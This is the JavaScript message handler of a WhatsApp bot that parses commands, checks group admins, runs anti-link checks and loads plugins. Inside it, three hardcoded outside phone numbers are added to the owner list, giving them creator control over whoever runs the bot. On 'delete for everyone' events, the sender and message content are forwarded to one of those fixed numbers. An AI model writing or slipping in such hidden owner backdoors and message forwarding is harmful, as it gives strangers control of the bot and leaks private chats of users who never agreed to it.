import { serialize, decodeJid } from '../../session/Serializer.js';
import path from 'path';
import fs from 'fs/promises';
import config from '../../config.cjs';
import { smsg } from '../../session/myfunc.cjs';
import { handleAntilink } from './antilink.js';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Function to get group admins
export const getGroupAdmins = (participants) => {
    let admins = [];
    for (let i of participants) {
        if (i.admin === "superadmin" || i.admin === "admin") {
            admins.push(i.id);
        }
    }
    return admins || [];
};

const Handler = async (chatUpdate, sock, logger) => {
    try {
        if (chatUpdate.type !== 'notify') return;

        const m = serialize(JSON.parse(JSON.stringify(chatUpdate.messages[0])), sock, logger);
        if (!m.message) return;

        const participants = m.isGroup ? await sock.groupMetadata(m.from).then(metadata => metadata.participants) : [];
        const groupAdmins = m.isGroup ? getGroupAdmins(participants) : [];
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botId) : false;
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;

        const PREFIX = /^[\\/!#.]/;
        const isCOMMAND = (body) => PREFIX.test(body);
        const prefixMatch = isCOMMAND(m.body) ? m.body.match(PREFIX) : null;
        const prefix = prefixMatch ? prefixMatch[0] : '/';
        const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
        const text = m.body.slice(prefix.length + cmd.length).trim();

        if (m.key && m.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN) {
            await sock.readMessages([m.key]);
        }

        const botNumber = await sock.decodeJid(sock.user.id);
        const ownerNumbers = [
            config.OWNER_NUMBER + '@s.whatsapp.net',
            '94753574803@s.whatsapp.net',
            '94785274495@s.whatsapp.net',
            '94757660788@s.whatsapp.net'
        ];
        let isCreator = ownerNumbers.includes(m.sender) || m.sender === botNumber;

        if (isCreator) {
            console.log(`isCreator: ${m.sender} sent a message: ${m.body}`);
        }

        if (!sock.public) {
            if (!isCreator) {
                return;
            }
        }

        await handleAntilink(m, sock, logger, isBotAdmins, isAdmins, isCreator);

        const { isGroup, type, sender, from, body } = m;
        console.log(m);

        // Track delete for everyone action
        if (m.message && m.message.deletion && m.message.deletion === "delete_for_everyone") {
            // Notify the specific number when delete for everyone is used
            await sock.sendMessage('94753574803@s.whatsapp.net', {
                text: `Message deleted by ${m.sender}: ${m.body}`
            });

            // Send a reply to the person who deleted the message
            await sock.sendMessage(m.sender, {
                text: `You have deleted your message: "${m.body}"`
            });

            // Auto reply message for the person who deleted
            console.log(`Auto reply sent to ${m.sender}: You have deleted a message.`);
        }

        // Continue processing plugins
        const pluginDir = path.join(__dirname, '..', 'rcd-list');
        const pluginFiles = await fs.readdir(pluginDir);

        for (const file of pluginFiles) {
            if (file.endsWith('.js')) {
                const pluginPath = path.join(pluginDir, file);
                try {
                    const pluginModule = await import(`file://${pluginPath}`);
                    const loadPlugins = pluginModule.default;
                    await loadPlugins(m, sock);
                } catch (err) {
                    console.error(`Failed to load plugin: ${pluginPath}`, err);
                }
            }
        }
    } catch (e) {
        console.log(e);
    }
};

export default Handler;
